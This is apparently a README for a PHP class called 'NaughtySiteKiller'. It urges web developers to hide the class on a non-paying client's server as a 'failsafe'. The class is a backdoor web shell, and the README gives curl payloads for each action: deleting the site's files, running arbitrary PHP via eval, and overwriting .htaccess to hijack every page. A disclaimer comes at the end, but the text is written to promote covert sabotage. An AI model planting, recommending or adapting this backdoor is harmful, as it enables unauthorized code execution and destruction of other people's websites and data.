## Is Your Client a Naughty Client?

~We don't like peace, we want problems always.~

### Naughty Killer Class

Ah, the joy of building a website for a "naughty" client who refuses to pay after getting full access to their cPanel. Don't fret! Instead of chasing them down, just drop the **NaughtySiteKiller** class on their server as a failsafe. This class lets you send HTTP requests to perform some rather *justifiable* actions on their website—whether it's deleting files, creating fake templates, or obstructing their site's content. It's the digital equivalent of "you won't pay? Fine, enjoy your broken website.

#### Key Features:
1. **Authentication**: Validates requests using Bearer or Basic token schemes.
2. **Token Generation**: Generate tokens from a password for authentication purposes.
3. **Action Handling**: Executes actions like `kill` (deletes files and self-destructs the script), `template` (creates template files and updates `.htaccess`) or `execute` (Execute a string as PHP code using `eval` function).
4. **Security**: Ensures that requests are authenticated by comparing the hashed token value.

---

### Usage Examples


Simply place the `NaughtySiteKiller` class on their server as an insurance measure. It supports token-based authentication and various actions like deleting files, creating templates, and updating `.htaccess` securely.

#### 1. Generating a Hashed Token

To authenticate requests, generate a token by hashing a password using the `sha256` algorithm. This token will be used for all incoming HTTP requests.

**Example**:
```php
$password = 'super_secret_password';
$token = \PeterUjah\NaughtySiteKiller::generateToken($password);  // Returns: "Bearer <hashed-password>"
```

Alternatively, you can directly hash the password:
```php
$password = 'super_secret_password';
echo hash('sha256', $password);  // Outputs the hashed token
```

---

#### 2. Handling the Incoming Request

Place the `NaughtySiteKiller` handler on the public directory of the website where it can be accessed through HTTP requests. This handler will process incoming requests, validate the authorization token, check the requested action (`kill`, `execute`, `template`, `self-key`), and execute the appropriate method.

**Example Usage**:
```php
// path/to/public_html/psk.php 
<?php
use \PeterUjah\NaughtySiteKiller;

// Run script without interruptions. 
NaughtySiteKiller::uninterrupted();

$psk = new NaughtySiteKiller('<your-secure-bearer-hashed-token-here>');
try {
    $psk->run();  // Run the script based on incoming HTTP request
} catch (Exception $e) {
    $psk->response("Unknown error occurred: {$e->getMessage()}", 500);  // Handle errors
}
```

> **Note**: Replace `<your-secure-bearer-hashed-token-here>` with the hashed token you generated in the previous step.

---

### Payload Fields

The following fields can be included in the payload when sending a request:

```php
$request = [
    'action'      => 'kill', // Action to perform: 'kill', 'execute', 'template', or 'self-key'.
    'content'     => 'Content for the template, execute (used in both HTML and PHP files when performing kill action, or for template creation).',
    'htmlContents'=> 'Content for the template.html file (used when performing kill action).', // HTML content for the template.
    'phpContents' => 'Content for the template.php file (used when performing kill action).', // PHP content for the template.
    'name'        => 'Filename to use when performing template action.', // Custom filename for the template.
    'htaccess'    => 'Content for the .htaccess file (overwrites existing .htaccess).',
];
```

#### Explanation of Fields:

- **`action`** (string): Specifies which action to perform:
  - `'kill'`: Deletes files including self and creates `index.php` and `index.html` files (HTML and PHP).
  - `'execute'`: Execute a string as PHP code using `eval` function. The instructions should be placed in `contents`.
  - `'template'`: Creates template file `<name>.php` and modifies `.htaccess` to redirect all website request to `<name>.php` if no custom htaccess content is provided.
  - `'self-key'`: self-destructing, delete the handler file only.
  
- **`content`** (string): Content to include in the generated template files. Used for both HTML and PHP files during the `kill` action, or for the `template` action.

- **`htmlContents`** (string): Content to be placed in the `<template-name>.html` file when performing the `kill` action.

- **`phpContents`** (string): Content to be placed in the `<template-name>.php` file when performing the `kill` action.

- **`name`** (string): The name of the template file to use when performing the `template` action. Default is `__template.php` if not specified.

- **`htaccess`** (string): The content for the `.htaccess` file. This will overwrite any existing `.htaccess` file during the `template` action. If not provided it will use default to redirect requests to the `<template-name>.php`.

---

### Payload Requests Examples

Here are examples of how to send payload requests using `curl` for the different actions (`kill`, `template`, and `self-key`), including the Bearer token in the header.

### 1. Kill Action Request (Deletes all files and creates template files)

```bash
curl -X POST http://your-server-url/naughty.php \
     -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
           "action": "kill",
           "phpContents": "<?php echo \"Hello, World!\"; ?>",
           "htmlContents": "<html><body><h1>Hello, World!</h1></body></html>"
        }'
```

---

### 2. Execute Action (Run custom code on the server—because we trust you)

The Execute Action allows you to send custom PHP code to be executed on the server. It's like a magic wand for your commands.

```bash
curl -X POST http://your-server-url/naughty.php \
     -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
           "action": "execute",
           "contents": "return \"Hello, Naughty Client!\";"
        }'
```

**Output:**

This will execute the PHP code and you will receive the following response:

```php
{
    "message": "Execution completed",
    "result": "Hello, Naughty Client!"
}
```

---

#### Explanation:

- `action`: Set to `"kill"` to trigger the kill action.
- `phpContents`: Content for the `template.php` file.
- `htmlContents`: Content for the `template.html` file.

### 3. Template Action Request (Creates template files and updates `.htaccess`)

```bash
curl -X POST http://your-server-url/naughty.php \
     -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
           "action": "template",
           "content": "<?php echo \"Welcome to the template!\"; ?>",
           "name": "custom_template.php",
           "htaccess": "RewriteEngine On\nRewriteRule ^.*$ custom_template.php [L,QSA]"
        }'
```

#### Explanation:

- `action`: Set to `"template"` to create a template file and update `.htaccess`.
- `content`: Content for the template (PHP code).
- `name`: Custom name for the template file (`custom_template.php`).
- `htaccess`: Custom `.htaccess` content to redirect all requests to the template.

---

### 4. **Self-Key Action Request (Reserved for future use)**

```bash
curl -X POST http://your-server-url/naughty.php \
     -H "Authorization: Bearer YOUR_BEARER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
           "action": "self-key"
        }'
```

#### Explanation:
- `action`: Set to `"self-key"`, delete the handler file only.

---

### Notes:
- **Authorization**: Replace `YOUR_BEARER_TOKEN` with the actual Bearer token you are using for authentication.
- **Server URL**: Replace `http://your-server-url/naughty.php` with the actual URL of your script.
- **Payload**: The payload for each action is sent as JSON in the body of the request using the `-d` flag with `curl`.

---

**Developer Responsibility**:

The use of this class is solely the responsibility of the user/developer. The creator and contributors of this class **disclaim any responsibility for abuse** or damage caused by its misuse. Proper authentication, authorization, and input validation are **mandatory** to prevent unauthorized access and malicious usage. Any unauthorized use of this class is **strictly prohibited** and is the responsibility of the user.
